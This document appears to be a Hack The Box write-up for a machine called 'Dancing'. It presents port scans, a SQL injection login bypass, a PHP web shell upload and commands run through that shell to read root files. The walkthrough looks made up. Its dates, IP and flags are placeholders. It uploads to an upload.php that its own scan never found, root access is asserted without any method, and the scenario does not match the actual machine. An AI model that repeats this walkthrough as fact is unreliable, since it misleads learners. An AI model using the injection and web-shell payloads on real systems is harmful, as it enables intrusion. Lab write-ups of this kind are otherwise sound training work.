# Hack The Box - Dancing Writeup

## Machine Information
- **Name:** Dancing
- **Difficulty:** Easy
- **Category:** Web
- **Points:** 20
- **Release Date:** [Date]
- **Retire Date:** [Date]
- **IP Address:** 10.10.10.3 (example)

## Reconnaissance

### Port Scanning
```bash
# Initial nmap scan
nmap -sC -sV -oN nmap_initial 10.10.10.3

# Results
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29
|_http-title: Did not follow redirect to http://dancing.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### DNS Enumeration
The web server redirects to `dancing.htb`, so we need to add this to our hosts file:

```bash
echo "10.10.10.3 dancing.htb" >> /etc/hosts
```

### Web Enumeration
```bash
# Directory brute-forcing
gobuster dir -u http://dancing.htb -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt

# Results
/index.php (Status: 200)
/login.php (Status: 200)
/server-status (Status: 403)
```

### Technology Stack
- Apache 2.4.29
- PHP (likely)
- MySQL (suspected)

## Initial Access

### Web Application Analysis
The website has a login page. Let's examine the source code and functionality:

```bash
# View page source
curl -s http://dancing.htb/ | head -50
```

### SQL Injection Testing
Testing the login form for SQL injection:

```bash
# Basic SQLi test
sqlmap -u "http://dancing.htb/login.php" --data="username=admin&password=admin" --batch

# Or manual testing
curl -X POST http://dancing.htb/login.php -d "username=admin' OR '1'='1&password=admin"
```

### Successful SQL Injection
The login form is vulnerable to SQL injection. We can bypass authentication:

```sql
username: admin' OR '1'='1' -- -
password: anything
```

This gives us access to the admin panel.

## Privilege Escalation

### Database Access
From the web application, we can access the database or find database credentials.

### Web Shell Upload
```bash
# Upload a PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -X POST http://dancing.htb/upload.php -F "file=@shell.php"
```

### Command Execution
```bash
# Execute commands via web shell
curl "http://dancing.htb/uploads/shell.php?cmd=id"
curl "http://dancing.htb/uploads/shell.php?cmd=whoami"
```

### Linux Privilege Escalation
```bash
# Check for sudo permissions
curl "http://dancing.htb/uploads/shell.php?cmd=sudo -l"

# Look for SUID binaries
curl "http://dancing.htb/uploads/shell.php?cmd=find / -perm -4000 2>/dev/null"

# Check kernel version for exploits
curl "http://dancing.htb/uploads/shell.php?cmd=uname -a"
```

### Root Access
Using a kernel exploit or misconfigured service to gain root access.

## Flags

### User Flag
```bash
curl "http://dancing.htb/uploads/shell.php?cmd=cat /home/user/user.txt"
HTB{user_flag_content}
```

### Root Flag
```bash
curl "http://dancing.htb/uploads/shell.php?cmd=cat /root/root.txt"
HTB{root_flag_content}
```

## Key Learnings

1. **SQL Injection**: Classic web application vulnerability
2. **Input Validation**: Importance of sanitizing user inputs
3. **Web Shells**: PHP web shells for command execution
4. **Linux Enumeration**: System reconnaissance techniques
5. **Privilege Escalation**: From web shell to root access

## Tools Used

- nmap (port scanning)
- gobuster (directory enumeration)
- sqlmap (SQL injection testing)
- curl (web requests and command execution)
- Metasploit (potential exploits)

## Attack Timeline

1. **Reconnaissance** (15 minutes): Port scanning and web enumeration
2. **Web Analysis** (10 minutes): Source code review and functionality testing
3. **SQL Injection** (10 minutes): Login bypass and database access
4. **Web Shell** (5 minutes): Upload and command execution
5. **Privilege Escalation** (15 minutes): From web user to root
6. **Flag Hunting** (5 minutes): Locating and capturing flags

**Total Time:** ~60 minutes

## Prevention

1. **Input Validation**: Use prepared statements and parameterized queries
2. **Web Application Firewall**: Implement WAF rules
3. **File Upload Security**: Validate and restrict file uploads
4. **Least Privilege**: Run web applications with minimal permissions
5. **Regular Updates**: Keep software and dependencies updated

## References

- Hack The Box Dancing machine
- SQL injection techniques
- Web application security
- Linux privilege escalation